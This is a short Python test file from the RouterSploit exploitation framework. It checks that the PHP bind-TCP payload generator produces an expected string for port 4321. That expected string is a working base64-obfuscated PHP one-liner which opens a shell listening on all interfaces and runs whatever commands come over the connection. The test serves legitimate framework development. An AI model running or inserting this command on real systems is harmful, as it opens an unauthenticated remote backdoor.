from routersploit.modules.payloads.cmd.php_bind_tcp import Payload


# php bind tcp payload with rport=4321
bind_tcp = (
    "php -r \"eval(base64_decode('JHM9c29ja2V0X2NyZWF0ZShBRl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApO3NvY2tldF9iaW5kKCRzLCIwLjAuMC4wIiw0MzIxKTtzb2NrZXRfbGlzdGVuKCRzLDEpOyRjbD1zb2NrZXRfYWNjZXB0KCRzKTt3aGlsZSgxKXtpZighc29ja2V0X3dyaXRlKCRjbCwiJCAiLDIpKWV4aXQ7JGluPXNvY2tldF9yZWFkKCRjbCwxMDApOyRjbWQ9cG9wZW4oIiRpbiIsInIiKTt3aGlsZSghZmVvZigkY21kKSl7JG09ZmdldGMoJGNtZCk7c29ja2V0X3dyaXRlKCRjbCwkbSxzdHJsZW4oJG0pKTt9fQ=='));\""
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.rport = 4321

    assert payload.run() == bind_tcp
